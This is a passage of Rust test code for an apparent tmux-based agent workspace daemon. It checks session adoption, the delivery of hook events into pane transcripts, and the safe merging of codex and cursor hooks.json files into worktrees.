        let ws = svc
            .store
            .set_workspace_identity(ws.id, ws.resource_version, &ws.branch, false)
            .unwrap();
        assert!(!ws.is_main_checkout, "the test must start from the wrong flag to mean anything");

        match svc.remove_worktree(ws.id).await {
            Err(DomainError::InvalidArgument { what }) => assert_eq!(what, "the main checkout"),
            other => panic!("expected InvalidArgument(\"the main checkout\"), got {other:?}"),
        }
    }

    // No test here for the unhealthy-inventory refusal (`TmuxUnavailable`).
    // `Service::inventory` is a concrete `LiveInventory`, not a trait object —
    // there is no seam to hand it a `FakeInventory::unavailable()` the way
    // `derive::tests` can for the pure derivation rule. Forcing it unhealthy
    // for real would mean starving or killing the private tmux server a
    // `fixture()` service just started, which is exactly the kind of live-tmux
    // dependency this task was told not to chase. The guard is exercised
    // instead by direct code inspection against `remove_root`'s identical
    // check, which this was copied from.
}

#[cfg(test)]
mod claude_session_adoption_tests {
    use super::identifies_claude;

    #[test]
    fn a_chat_capable_agent_that_is_not_claude_cannot_adopt_a_claude_session() {
        // Regression test for a real bug: `pane_can_adopt_a_claude_session`
        // (the sole caller of `identifies_claude`) used to gate adoption on
        // `chat_capable`, which was correct back when Claude was the only
        // chat-capable harness — the two questions had the same answer. Once
        // codex and cursor got adapters, `chat_capable` stopped implying
        // "claude", and a codex pane with no session of its own would pass
        // the old gate, then `discover_claude_session` — which only ever
        // returns a CLAUDE session id — would hand it somebody else's Claude
        // conversation to launch the codex adapter against.
        //
        // This asserts against `identifies_claude` directly rather than
        // through `set_pane_mode`: the real predicate needs a live tmux pane
        // and a screen capture behind `pane_can_adopt_a_claude_session`, which
        // this crate's test seams do not build without a running tmux server.
        // Reverting `identifies_claude` to
        // `registry.identify(..).is_some_and(|r| registry.chat_capable(&r.preset))`
        // makes this test fail, which is the point.
        let r = farcooler_core::activity::Registry::built_in();

        // The exact fact that made the old gate wrong: codex answers
        // `chat_capable` yes.
        assert!(r.chat_capable("codex"));

        // But it must never be treated as adoptable through this path.
        let codex_screen = "\u{203a} Explain this codebase\n  >_ OpenAI Codex (v0.145.0)";
        assert!(!identifies_claude(&r, "codex-aarch64-a", codex_screen));

        // cursor-agent too, for the same reason.
        assert!(r.chat_capable("cursor"));
        assert!(!identifies_claude(
            &r,
            "node",
            "Press any key to sign in..."
        ));

        // Claude itself is unaffected: it still says yes.
        let claude_screen = "Claude Code\n? for shortcuts";
        assert!(identifies_claude(&r, "claude", claude_screen));

        // A shell is neither chat-capable nor claude.
        assert!(!identifies_claude(&r, "zsh", "e-liang@Mac project % "));
    }
}

#[cfg(test)]
mod hook_wiring_tests {
    use super::*;
    use tokio::io::AsyncWriteExt;

    /// A hook that fires reaches the transcript clients already read.
    ///
    /// End to end, over the real socket, because the failure this is written
    /// against is not in any of the pieces. `HookIngress::listen` has its own
    /// tests, `MessageAssembler` has its own tests, and
    /// `AgentSupervisor::record` has its own tests; the whole feature is still
    /// inert if nothing binds `h.sock` in a running daemon. That is exactly
    /// what happened to the shim path — `agent_supervisor::ensure_listening`
    /// carries the note: "`listen` was written, tested and never called, so
    /// the socket was never bound ... The whole feature was inert and nothing
    /// said so."
    ///
    /// So this drives the startup call `main.rs` makes and then behaves like
    /// `farcooler hook`: connect, write one frame, and read the conversation
    /// back out of the supervisor.
    #[tokio::test]
    async fn a_hook_arriving_on_the_socket_lands_in_the_terminals_transcript() {
        let dir = tempfile::tempdir().unwrap();
        let service = Service::open_in(dir.path().to_path_buf()).await.unwrap();
        let root = service
            .store
            .create_repository_root(service.host_id, "/tmp/hook-wiring-tests", now_millis())
            .unwrap();
        let repository = service
            .store
            .create_repository(service.host_id, root.id, "repo", "/tmp/hook-wiring-tests/.git", "")
            .unwrap();
        let workspace = service
            .store
            .create_workspace(repository.id, "main", "/tmp/hook-wiring-tests", true)
            .unwrap();
        let term = service
            .store
            .create_terminal(workspace.id, "pane", "claude", TerminalIntent::Running, 80, 24)
            .unwrap();
        // The pane stays in TERMINAL mode. A claude somebody is running for
        // themselves is the whole point of the hook path, and putting this one
        // in agent mode would prove the shim's story instead.
        let term = service
            .store
            .set_pane_mode(
                term.id,
                term.resource_version,
                models::PaneMode::Terminal,
                Some("a-session".to_string()),
                false,
            )
            .unwrap();
        assert_eq!(term.pane_mode, models::PaneMode::Terminal);

        service.resume_agent_listeners();

        // The bind happens in a spawned task, so the socket appears a moment
        // after the call rather than during it.
        let socket = hook_ingress::HookIngress::socket_path(&service.root);
        let mut stream = None;
        for _ in 0..200 {
            if let Ok(s) = tokio::net::UnixStream::connect(&socket).await {
                stream = Some(s);
                break;
            }
            tokio::time::sleep(std::time::Duration::from_millis(10)).await;
        }
        let mut stream = stream.unwrap_or_else(|| {
            panic!("nothing is listening on {} — no live session can report anything", socket.display())
        });

        let frame = serde_json::to_string(&serde_json::json!({
            "agent": "claude",
            "event": "UserPromptSubmit",
            "payload": { "session_id": "a-session", "prompt": "count the panes" },
        }))
        .unwrap();
        stream.write_all(format!("{frame}\n").as_bytes()).await.unwrap();
        stream.flush().await.unwrap();

        let mut events = Vec::new();
        for _ in 0..200 {
            events = service.agents.replay(term.id, 0, 0).1;
            if !events.is_empty() {
                break;
            }
            tokio::time::sleep(std::time::Duration::from_millis(10)).await;
        }

        assert_eq!(events.len(), 1, "one hook, one event, on the terminal that claims the session");
        assert_eq!(events[0].seq, 0, "numbered by the supervisor, at the start of this transcript");
        assert!(
            matches!(
                &events[0].event,
                farcooler_agent::event::AgentEvent::Message {
                    role: farcooler_agent::event::Role::User,
                    text,
                    ..
                } if text == "count the panes"
            ),
            "the prompt somebody typed is what the transcript holds, got {:?}",
            events[0].event
        );
        assert_eq!(
            service.agents.activity(term.id),
            farcooler_protocol::v1::AgentActivity::Unspecified,
            "a user's own words say nothing about what the agent is doing — \
             `activity_source::observe` returns `None` for them"
        );
        // The assembler that half-built that message is one THIS service can
        // reach, which is the difference between spawning from `self.hooks`
        // and constructing a `HookIngress` inside the spawn. Both deliver the
        // event above; only one of them can ever be told the terminal went
        // away, and `remove_terminal` calls `forget` on this one.
        assert!(
            service.hooks.is_tracking(term.id),
            "the listener is assembling into a `HookIngress` nothing can evict from"
        );
    }

    /// Codex's prose, from the transcript it names, over the SAME production
    /// path as the test above -- `resume_agent_listeners`, the real socket,
    /// `HookIngress::serve`'s own `start_transcript_tail` -- rather than
    /// against `transcript_tail`'s or `hook_ingress`'s pieces in isolation.
    /// Without this the whole feature could be exactly the shape task 8's own
    /// tests already proved and still be unreachable, which is precisely how
    /// the shim path spent its first week: `listen` "was written, tested and
    /// never called" (`resume_agent_listeners`'s own doc, quoting
    /// `agent_supervisor::ensure_listening`'s note).
    /// A pane in agent mode is fed by its shim; a hook must not feed it too.
    ///
    /// **The test that did not exist.** `agent_supervisor`'s
    /// `a_recorded_event_continues_the_transcript_the_shim_started` documented
    /// this hazard and deferred it on the premise that "nothing in this tree
    /// writes any of those three files yet" — and six commits later, on this
    /// same branch, `install_project_hooks` wrote `.codex/hooks.json` into
    /// every worktree Far Cooler makes. Nothing noticed, because the only
    /// place the question was written down was a comment, and a comment cannot
    /// fail.
    ///
    /// This drives the route that made it live: codex, project-local hooks, no
    /// `agent_session_id`, bound by worktree through `announced_terminal`.
    ///
    /// Two panes rather than one pane flipped between frames, and the first
    /// draft was the flip — which failed, correctly, and taught the shape of
    /// the test. `serve` reads a connection's lines in its own task, so
    /// mutating the row between two writes races the read: the chat frame was
    /// still queued when the row went back to terminal mode, and it bound
    /// against the mode it was never sent under. Two panes in two worktrees
    /// remove the race entirely — nothing is mutated at all, and one
    /// connection's frames are handled in order, so the moment B's event
    /// lands, A's frame has definitively been processed and refused.
    #[tokio::test]
    async fn a_pane_in_agent_mode_is_never_handed_a_hook_as_well() {
        let dir = tempfile::tempdir().unwrap();
        let service = Service::open_in(dir.path().join("state")).await.unwrap();
        let root = service
            .store
            .create_repository_root(service.host_id, &dir.path().to_string_lossy(), now_millis())
            .unwrap();
        let repository = service
            .store
            .create_repository(
                service.host_id,
                root.id,
                "repo",
                &dir.path().join(".git").to_string_lossy(),
                "",
            )
            .unwrap();

        // Two worktrees, one codex pane each, so every announcement below
        // binds unambiguously by `cwd` and nothing has to be mutated mid-test.
        let mut panes = Vec::new();
        for (name, mode) in [("chat", models::PaneMode::Agent), ("plain", models::PaneMode::Terminal)]
        {
            let worktree = dir.path().join(name);
            std::fs::create_dir_all(&worktree).unwrap();
            let workspace = service
                .store
                .create_workspace(repository.id, name, &worktree.to_string_lossy(), false)
                .unwrap();
            let term = service
                .store
                .create_terminal(workspace.id, name, "codex", TerminalIntent::Running, 80, 24)
                .unwrap();
            // No session id, which is what a codex pane always has: nothing
            // mints one at launch. That is exactly the shape
            // `announced_terminal` admits, and the reason the pane mode is the
            // only thing left that can refuse it.
            let term = service
                .store
                .set_pane_mode(term.id, term.resource_version, mode, None, false)
                .unwrap();
            assert_eq!(term.pane_mode, mode);
            panes.push((worktree, term));
        }
        let (chat_worktree, chat) = panes[0].clone();
        let (plain_worktree, plain) = panes[1].clone();

        service.resume_agent_listeners();
        let socket = hook_ingress::HookIngress::socket_path(&service.root);
        let mut stream = None;
        for _ in 0..200 {
            if let Ok(s) = tokio::net::UnixStream::connect(&socket).await {
                stream = Some(s);
                break;
            }
            tokio::time::sleep(std::time::Duration::from_millis(10)).await;
        }
        let mut stream =
            stream.unwrap_or_else(|| panic!("nothing is listening on {}", socket.display()));

        let frame = |cwd: &Path, session: &str, prompt: &str| {
            serde_json::to_string(&serde_json::json!({
                "agent": "codex",
                "event": "UserPromptSubmit",
                "payload": {
                    "session_id": session,
                    "cwd": cwd.to_string_lossy(),
                    "prompt": prompt,
                },
            }))
            .unwrap()
        };

        for line in [
            frame(&chat_worktree, "a-chats-session", "this pane has a shim"),
            frame(&plain_worktree, "a-plain-session", "this pane has only hooks"),
        ] {
            stream.write_all(format!("{line}\n").as_bytes()).await.unwrap();
        }
        stream.flush().await.unwrap();

        let texts = |service: &Service, id: Uuid| -> Vec<String> {
            service
                .agents
                .replay(id, 0, 0)
                .1
                .iter()
                .filter_map(|s| match &s.event {
                    farcooler_agent::event::AgentEvent::Message { text, .. } => Some(text.clone()),
                    _ => None,
                })
                .collect()
        };

        // The barrier. A negative over a socket cannot be proven by waiting a
        // while and finding nothing — that passes just as well against a
        // listener that is broken, or one that never bound at all. The second
        // frame landing is what says the first was read, routed and refused.
        let mut landed = Vec::new();
        for _ in 0..400 {
            landed = texts(&service, plain.id);
            if !landed.is_empty() {
                break;
            }
            tokio::time::sleep(std::time::Duration::from_millis(10)).await;
        }
        assert_eq!(
            landed,
            vec!["this pane has only hooks".to_string()],
            "a terminal-mode pane's hook still reaches it; without this the test below proves nothing"
        );

        assert!(
            texts(&service, chat.id).is_empty(),
            "the agent-mode pane's transcript belongs to its shim alone, got {:?}",
            texts(&service, chat.id)
        );
    }

/// The other route into the same defect, and the reason the guard is on
    /// `terminal_for` rather than only inside `announced_terminal`.
    ///
    /// A pane that DOES name a session routes by the claimants join and never
    /// reaches the announcement path at all. That route is live for both
    /// agents that can be in agent mode: claude's id comes from `--session-id`
    /// at launch, and codex's from the shim's own `Established` report, which
    /// `set_pane_mode` stores (see its comment on preferring the shim's id).
    /// So an agent-mode pane carrying a session id is exactly as double-fed as
    /// one carrying none, by a different path, and a fix that guarded only the
    /// announcement would have left it.
    #[tokio::test]
    async fn a_chat_that_names_its_session_is_refused_by_the_other_route_too() {
        let dir = tempfile::tempdir().unwrap();
        let service = Service::open_in(dir.path().join("state")).await.unwrap();
        let root = service
            .store
            .create_repository_root(service.host_id, &dir.path().to_string_lossy(), now_millis())
            .unwrap();
        let repository = service
            .store
            .create_repository(
                service.host_id,
                root.id,
                "repo",
                &dir.path().join(".git").to_string_lossy(),
                "",
            )
            .unwrap();
        let workspace = service
            .store
            .create_workspace(repository.id, "main", &dir.path().to_string_lossy(), true)
            .unwrap();
        let term = service
            .store
            .create_terminal(workspace.id, "pane", "claude", TerminalIntent::Running, 80, 24)
            .unwrap();

        let facts = farcooler_agent_hooks::facts::Facts {
            session_id: Some("a-declared-session".to_string()),
            cwd: Some(dir.path().to_path_buf()),
            transcript_path: None,
        };

        // In terminal mode the join binds, which is the whole hook feature and
        // is what makes the refusal below mean something.
        let term = service
            .store
            .set_pane_mode(
                term.id,
                term.resource_version,
                models::PaneMode::Terminal,
                Some("a-declared-session".to_string()),
                false,
            )
            .unwrap();
        assert_eq!(
            service.hooks.terminal_for(&facts, farcooler_agent_hooks::Agent::Claude),
            Some(term.id),
            "a terminal-mode pane that names this session is exactly who the hook is for"
        );

        // The same row, the same session, the same facts. Only the mode moves.
        let term = service
            .store
            .set_pane_mode(
                term.id,
                term.resource_version,
                models::PaneMode::Agent,
                Some("a-declared-session".to_string()),
                false,
            )
            .unwrap();
        assert_eq!(term.pane_mode, models::PaneMode::Agent);
        assert_eq!(
            service.hooks.terminal_for(&facts, farcooler_agent_hooks::Agent::Claude),
            None,
            "a chat's conversation arrives over its shim; the hook must go nowhere"
        );
    }

    #[tokio::test]
    async fn a_codex_hooks_own_transcript_reaches_the_terminals_transcript() {
        let dir = tempfile::tempdir().unwrap();
        let service = Service::open_in(dir.path().to_path_buf()).await.unwrap();
        let root = service
            .store
            .create_repository_root(service.host_id, "/tmp/codex-transcript-tests", now_millis())
            .unwrap();
        let repository = service
            .store
            .create_repository(service.host_id, root.id, "repo", "/tmp/codex-transcript-tests/.git", "")
            .unwrap();
        let workspace = service
            .store
            .create_workspace(repository.id, "main", "/tmp/codex-transcript-tests", true)
            .unwrap();
        let term = service
            .store
            .create_terminal(workspace.id, "pane", "codex", TerminalIntent::Running, 80, 24)
            .unwrap();
        // The session-id join alone, exactly like the claude test above --
        // codex's OWN binding path (`announced_terminal`) is a different
        // task's surface, and this test's subject is what happens once a
        // terminal is bound, not how it got that way.
        let term = service
            .store
            .set_pane_mode(
                term.id,
                term.resource_version,
                models::PaneMode::Terminal,
                Some("a-codex-session".to_string()),
                false,
            )
            .unwrap();

        // The rollout file codex would have opened on its first turn
        // (`docs/agent-session-logs.md`), named by `transcript_path` in every
        // payload below -- nothing here reads the real `~/.codex/sessions`.
        let rollout = dir.path().join("rollout.jsonl");
        std::fs::write(&rollout, "").unwrap();

        service.resume_agent_listeners();

        let socket = hook_ingress::HookIngress::socket_path(&service.root);
        let mut stream = None;
        for _ in 0..200 {
            if let Ok(s) = tokio::net::UnixStream::connect(&socket).await {
                stream = Some(s);
                break;
            }
            tokio::time::sleep(std::time::Duration::from_millis(10)).await;
        }
        let mut stream = stream.unwrap_or_else(|| {
            panic!("nothing is listening on {} — no live session can report anything", socket.display())
        });

        // One ordinary hook payload, carrying `transcript_path` the way
        // every real one does (`Facts`'s own doc) -- this alone is what
        // `start_transcript_tail` needs to begin.
        let frame = serde_json::to_string(&serde_json::json!({
            "agent": "codex",
            "event": "UserPromptSubmit",
            "payload": {
                "session_id": "a-codex-session",
                "prompt": "explain TCP slow start",
                "transcript_path": rollout.to_string_lossy(),
            },
        }))
        .unwrap();
        stream.write_all(format!("{frame}\n").as_bytes()).await.unwrap();
        stream.flush().await.unwrap();

        // Wait for the prompt to actually land before writing a single byte
        // of commentary. `start_transcript_tail` starts its tail at the
        // rollout's length AT THE MOMENT this hook is processed -- correct
        // for its real job, not replaying a session's history into a chat
        // that just attached -- but it means appending before that moment is
        // reached races the tail's own catch-up read and can be skipped as
        // "already there" even though nothing had actually read it yet. A
        // real codex never faces this: `UserPromptSubmit` fires before the
        // model has produced a single word of commentary for the turn it
        // opens, so the two can never be this close together outside a test
        // that removes the model generation time in between.
        let mut prompt_landed = false;
        for _ in 0..240 {
            if !service.agents.replay(term.id, 0, 0).1.is_empty() {
                prompt_landed = true;
                break;
            }
            tokio::time::sleep(std::time::Duration::from_millis(250)).await;
        }
        assert!(prompt_landed, "the hook above must have reached the terminal's transcript by now");

        // The prose no hook payload carries, appended to the file the hook
        // above just named -- codex's `item_completed`/`AgentMessage`
        // shape, mid-turn commentary rather than the closing line `Stop`
        // already sends (`transcript_tail`'s own doc on why the closing
        // line is dropped there).
        use std::io::Write as _;
        let mut rollout_file = std::fs::OpenOptions::new().append(true).open(&rollout).unwrap();
        writeln!(
            rollout_file,
            "{}",
            serde_json::json!({
                "type": "event_msg",
                "payload": {
                    "type": "item_completed",
                    "item": {
                        "type": "AgentMessage",
                        "phase": "commentary",
                        "content": [{ "text": "Reading the congestion window first." }],
                    },
                },
            })
        )
        .unwrap();

        let mut events = Vec::new();
        for _ in 0..240 {
            events = service.agents.replay(term.id, 0, 0).1;
            if events.len() >= 2 {
                break;
            }
            tokio::time::sleep(std::time::Duration::from_millis(250)).await;
        }

        assert_eq!(
            events.len(),
            2,
            "the prompt from the hook and the commentary from the transcript, and nothing else: {events:?}"
        );
        assert!(
            matches!(
                &events[0].event,
                farcooler_agent::event::AgentEvent::Message {
                    role: farcooler_agent::event::Role::User,
                    text,
                    ..
                } if text == "explain TCP slow start"
            ),
            "got {:?}",
            events[0].event
        );
        assert!(
            matches!(
                &events[1].event,
                farcooler_agent::event::AgentEvent::Message {
                    role: farcooler_agent::event::Role::Agent,
                    text,
                    parent: None,
                } if text == "Reading the congestion window first."
            ),
            "codex's own commentary, read out of the transcript its hook named, must reach the terminal's \
             transcript through the same `record` every other event goes through: got {:?}",
            events[1].event
        );
    }

    /// Cursor's own transcript is the ONLY source of its prose there is —
    /// `stop` carries none at all (`docs/agent-session-logs.md`, "cursor" --
    /// "Records") — which is what makes this the more important of the two
    /// agents this task covers, not merely the second one. Mirrors the codex
    /// test above through the same production path
    /// (`resume_agent_listeners`, a real socket, `HookIngress::serve`'s own
    /// `start_transcript_tail`), because a mutation deleting cursor from the
    /// agent gate in `start_transcript_tail` passed every OTHER test in this
    /// suite — every positive test before this one, the E2E included, was
    /// codex.
    #[tokio::test]
    async fn a_cursors_own_transcript_reaches_the_terminals_transcript() {
        let dir = tempfile::tempdir().unwrap();
        let service = Service::open_in(dir.path().to_path_buf()).await.unwrap();
        let root = service
            .store
            .create_repository_root(service.host_id, "/tmp/cursor-transcript-tests", now_millis())
            .unwrap();
        let repository = service
            .store
            .create_repository(service.host_id, root.id, "repo", "/tmp/cursor-transcript-tests/.git", "")
            .unwrap();
        let workspace = service
            .store
            .create_workspace(repository.id, "main", "/tmp/cursor-transcript-tests", true)
            .unwrap();
        let term = service
            .store
            .create_terminal(workspace.id, "pane", "cursor", TerminalIntent::Running, 80, 24)
            .unwrap();
        let term = service
            .store
            .set_pane_mode(
                term.id,
                term.resource_version,
                models::PaneMode::Terminal,
                Some("a-cursor-session".to_string()),
                false,
            )
            .unwrap();

        // Cursor's own transcript: `~/.cursor/projects/<slug>/agent-
        // transcripts/<uuid>/<uuid>.jsonl` for real, a bare temp file here --
        // nothing on this path reads the real directory.
        let transcript = dir.path().join("transcript.jsonl");
        std::fs::write(&transcript, "").unwrap();

        service.resume_agent_listeners();

        let socket = hook_ingress::HookIngress::socket_path(&service.root);
        let mut stream = None;
        for _ in 0..200 {
            if let Ok(s) = tokio::net::UnixStream::connect(&socket).await {
                stream = Some(s);
                break;
            }
            tokio::time::sleep(std::time::Duration::from_millis(10)).await;
        }
        let mut stream = stream.unwrap_or_else(|| {
            panic!("nothing is listening on {} — no live session can report anything", socket.display())
        });

        // Cursor's own spelling of the turn-start hook -- `beforeSubmitPrompt`,
        // lowercase, unlike claude's and codex's `UserPromptSubmit`
        // (`assemble.rs`'s own match arm names the same three spellings of
        // one event).
        let frame = serde_json::to_string(&serde_json::json!({
            "agent": "cursor",
            "event": "beforeSubmitPrompt",
            "payload": {
                "session_id": "a-cursor-session",
                "prompt": "write a haiku about lighthouses",
                "transcript_path": transcript.to_string_lossy(),
            },
        }))
        .unwrap();
        stream.write_all(format!("{frame}\n").as_bytes()).await.unwrap();
        stream.flush().await.unwrap();

        // Wait for the prompt to land before appending -- the same race this
        // file's codex test above documents: `start_transcript_tail` starts
        // its tail at the transcript's length AT THE MOMENT the hook is
        // processed, and appending before that moment is reached can be
        // skipped as "already there" even though nothing had actually read
        // it yet.
        let mut prompt_landed = false;
        for _ in 0..240 {
            if !service.agents.replay(term.id, 0, 0).1.is_empty() {
                prompt_landed = true;
                break;
            }
            tokio::time::sleep(std::time::Duration::from_millis(250)).await;
        }
        assert!(prompt_landed, "the hook above must have reached the terminal's transcript by now");

        // Cursor's real record shape: `{role, message: {content: [...]}}`
        // (`docs/agent-session-logs.md`, "cursor" -- "Records"), a `text`
        // block alongside a `tool_use` block on the same line, matching the
        // one real sample the format doc describes.
        use std::io::Write as _;
        let mut transcript_file = std::fs::OpenOptions::new().append(true).open(&transcript).unwrap();
        writeln!(
            transcript_file,
            "{}",
            serde_json::json!({
                "role": "assistant",
                "message": {
                    "content": [
                        { "type": "text", "text": "Running that command now." },
                        { "type": "tool_use", "name": "Shell", "input": { "command": "ls" } },
                    ],
                },
            })
        )
        .unwrap();

        let mut events = Vec::new();
        for _ in 0..240 {
            events = service.agents.replay(term.id, 0, 0).1;
            if events.len() >= 2 {
                break;
            }
            tokio::time::sleep(std::time::Duration::from_millis(250)).await;
        }

        assert_eq!(
            events.len(),
            2,
            "the prompt from the hook and cursor's own prose from its transcript, and nothing else \
             -- cursor's `stop` carries none at all: {events:?}"
        );
        assert!(
            matches!(
                &events[0].event,
                farcooler_agent::event::AgentEvent::Message {
                    role: farcooler_agent::event::Role::User,
                    text,
                    ..
                } if text == "write a haiku about lighthouses"
            ),
            "got {:?}",
            events[0].event
        );
        assert!(
            matches!(
                &events[1].event,
                farcooler_agent::event::AgentEvent::Message {
                    role: farcooler_agent::event::Role::Agent,
                    text,
                    parent: None,
                } if text == "Running that command now."
            ),
            "cursor's own prose, read out of the transcript its hook named, is the ONLY source of it there \
             is; got {:?}",
            events[1].event
        );
    }
}

/// The files a launched pane is registered through: claude's `--settings`
/// document in the runtime directory, and the project-local `.codex`/`.cursor`
/// hooks a new worktree gets.
///
/// Every case here is about a file somebody else may own. `hook_install`'s own
/// tests prove the merge preserves what was already there; these prove the
/// caller never hands the merge something it would be wrong to merge, and
/// never takes a workspace down over a directory it could not write.
#[cfg(test)]
mod hook_file_tests {
    use super::*;

    fn scratch(name: &str) -> PathBuf {
        let dir = std::env::temp_dir().join(format!(
            "farcooler-hooks-{}-{}-{name}",
            std::process::id(),
            Uuid::now_v7()
        ));
        std::fs::create_dir_all(&dir).expect("scratch dir");
        // A repository, as every worktree is: the installer asks git whether
        // it tracks a hooks file, and a directory git can't answer for is
        // "tracked", so nothing would be written into a bare directory.
        let status = std::process::Command::new("git")
            .arg("-C")
            .arg(&dir)
            .args(["init", "-q"])
            .status()
            .expect("git runs");
        assert!(status.success(), "git init in {}", dir.display());
        dir
    }

    #[tokio::test]
    async fn a_new_worktree_gets_the_two_files_codex_and_cursor_read() {
        let worktree = scratch("fresh");
        install_project_hooks(&worktree, Path::new("/tmp/h.sock")).await;

        let codex = std::fs::read_to_string(worktree.join(".codex/hooks.json"))
            .expect("codex hooks.json is written at the path codex reads");
        let cursor = std::fs::read_to_string(worktree.join(".cursor/hooks.json"))
            .expect("cursor hooks.json is written at the path cursor reads");

        // The shape each agent actually reads back, not merely "a file exists".
        let codex_v: serde_json::Value = serde_json::from_str(&codex).expect("codex json");
        assert!(
            codex_v["hooks"]["SessionStart"][0]["hooks"][0]["command"]
                .as_str()
                .is_some_and(|c| c.contains("--agent codex") && c.contains("/tmp/h.sock")),
            "codex's nested shape, naming this daemon's socket: {codex}"
        );
        let cursor_v: serde_json::Value = serde_json::from_str(&cursor).expect("cursor json");
        assert!(
            cursor_v["hooks"]["sessionStart"][0]["command"]
                .as_str()
                .is_some_and(|c| c.contains("--agent cursor") && c.contains("/tmp/h.sock")),
            "cursor's flat shape and its own event names: {cursor}"
        );

        let _ = std::fs::remove_dir_all(&worktree);
    }

    /// The support incident, not the test failure: a hooks file we cannot
    /// parse is somebody's file midway through an edit, and `merge_codex`
    /// treats text it cannot read as an empty document — so passing it
    /// through would hand back our three hooks alone and we would write that
    /// over theirs.
    #[tokio::test]
    async fn a_hooks_file_we_cannot_parse_is_left_exactly_as_it_was() {
        let worktree = scratch("unparseable");
        let path = worktree.join(".codex/hooks.json");
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        let theirs = "{ \"hooks\": { \"SessionStart\": [ oops this is not json";
        std::fs::write(&path, theirs).unwrap();

        install_project_hooks(&worktree, Path::new("/tmp/h.sock")).await;

        assert_eq!(
            std::fs::read_to_string(&path).unwrap(),
            theirs,
            "not one byte of a file we could not read is rewritten"
        );
        // And the agent whose file WAS readable is still installed: one
        // unreadable file costs that agent's live view and nothing else.
        assert!(worktree.join(".cursor/hooks.json").exists(), "cursor is unaffected");

        let _ = std::fs::remove_dir_all(&worktree);
    }

    /// Valid JSON that is not an object — an array, a bare string — reaches
    /// `parse_or_empty_object` as the same "nothing here yet" a garbled file
    /// does, so it needs the same guard.
    #[tokio::test]
    async fn a_hooks_file_that_is_json_but_not_an_object_is_left_alone_too() {
        let worktree = scratch("not-an-object");
        let path = worktree.join(".cursor/hooks.json");
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(&path, "[1, 2, 3]").unwrap();

        install_project_hooks(&worktree, Path::new("/tmp/h.sock")).await;

        assert_eq!(std::fs::read_to_string(&path).unwrap(), "[1, 2, 3]");

        let _ = std::fs::remove_dir_all(&worktree);
    }

    #[tokio::test]
    async fn an_existing_hooks_file_keeps_the_entries_it_already_had() {
        let worktree = scratch("theirs");
        let path = worktree.join(".codex/hooks.json");
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(
            &path,
            r#"{"hooks":{"SessionStart":[{"hooks":[{"type":"command","command":"bash /Users/x/herdr-agent-state.sh session"}]}]}}"#,
        )
        .unwrap();

        install_project_hooks(&worktree, Path::new("/tmp/h.sock")).await;

        let after = std::fs::read_to_string(&path).unwrap();
        assert!(after.contains("herdr-agent-state.sh"), "their hook survives: {after}");
        assert!(after.contains("--agent codex"), "and ours is there too: {after}");

        let _ = std::fs::remove_dir_all(&worktree);
    }

    /// A worktree we cannot write into is a logged line, never a workspace
    /// that fails to be created. `.cursor` as a FILE is the real shape of
    /// this: `create_dir_all` refuses, and the alternative — propagating
    /// that — would mean somebody's stray file stops them making a worktree.
    #[tokio::test]
    async fn a_worktree_we_cannot_write_into_costs_the_live_view_and_nothing_else() {
        let worktree = scratch("blocked");
        std::fs::write(worktree.join(".cursor"), "a file, not a directory").unwrap();

        install_project_hooks(&worktree, Path::new("/tmp/h.sock")).await;

        assert_eq!(
            std::fs::read_to_string(worktree.join(".cursor")).unwrap(),
            "a file, not a directory",
            "their file is untouched"
        );
        assert!(
            worktree.join(".codex/hooks.json").exists(),
            "and codex, which had nothing in the way, is installed"
        );

        let _ = std::fs::remove_dir_all(&worktree);
    }

    /// A `.codex` that links somewhere else is somebody's arrangement, and
    /// writing through it would put our entries in a file outside the
    /// worktree, such as the user's global `~/.codex/hooks.json`.
    #[tokio::test]
    async fn a_hooks_path_through_a_symbolic_link_is_not_written() {
        let worktree = scratch("linked");
        let elsewhere = scratch("elsewhere");
        std::os::unix::fs::symlink(&elsewhere, worktree.join(".codex")).unwrap();

        install_project_hooks(&worktree, Path::new("/tmp/h.sock")).await;

        assert!(!elsewhere.join("hooks.json").exists(), "written through the link");
        assert!(worktree.join(".cursor/hooks.json").exists(), "cursor, with no link in the way, is installed");

        let _ = std::fs::remove_dir_all(&worktree);
        let _ = std::fs::remove_dir_all(&elsewhere);
    }

    /// The launch paths' tracked check: tracked, untracked, and "can't tell"
    /// counted as tracked.
    #[tokio::test]
    async fn the_tracked_check_without_blocking_answers_what_git_says() {
        let bare = tempfile::tempdir().unwrap();
        assert!(git_tracks_without_blocking(bare.path(), crate::hook_install::CODEX_HOOKS).await, "not a repository");
        let repo = scratch("tracks");
        assert!(!git_tracks_without_blocking(&repo, crate::hook_install::CODEX_HOOKS).await, "unknown to git");
        std::fs::create_dir_all(repo.join(".codex")).unwrap();
        std::fs::write(repo.join(crate::hook_install::CODEX_HOOKS), "{}").unwrap();
        let out = git::git(&repo, &["add", "--", crate::hook_install::CODEX_HOOKS]).await.unwrap();
        assert!(out.ok, "{}", out.stderr);
        assert!(git_tracks_without_blocking(&repo, crate::hook_install::CODEX_HOOKS).await, "in the index");
        let _ = std::fs::remove_dir_all(&repo);
    }

    /// m7: no git at all is "can't tell", and so tracked. The program is
    /// named, not looked up on `PATH`, so this changes nothing for any other
    /// test running beside it.
    #[tokio::test]
    async fn a_missing_git_counts_as_tracked() {
        let repo = scratch("no-git");
        let missing = repo.join("no-such-git");
        let answer =
            git::run_bounded(missing.as_os_str(), git::GIT_TIMEOUT, &repo, &["ls-files", "--", "x"]).await;
        assert!(answer.is_err(), "a program that isn't there is an error, not an answer");
        assert!(tracked_by(answer), "and that error reads as tracked");
        let _ = std::fs::remove_dir_all(&repo);
    }

    /// m7: a git that never answers is killed at the timeout, and that is
    /// "can't tell" too. A script that `exec`s `sleep` stands in for git, so
    /// the process the timeout kills is the sleep itself.
    #[tokio::test]
    async fn a_git_that_never_answers_is_cut_off_and_counts_as_tracked() {
        use std::os::unix::fs::PermissionsExt;
        let repo = scratch("hung-git");
        let hung = repo.join("hung-git");
        std::fs::write(&hung, "#!/bin/sh\nexec sleep 30\n").unwrap();
        std::fs::set_permissions(&hung, std::fs::Permissions::from_mode(0o755)).unwrap();
        let started = std::time::Instant::now();
        let answer = git::run_bounded(
            hung.as_os_str(),
            std::time::Duration::from_millis(200),
            &repo,
            &["ls-files", "--", "x"],
        )
        .await;
        assert!(started.elapsed() < std::time::Duration::from_secs(10), "cut off, not waited out");
        assert!(answer.is_err(), "a timeout is an error, not an answer");
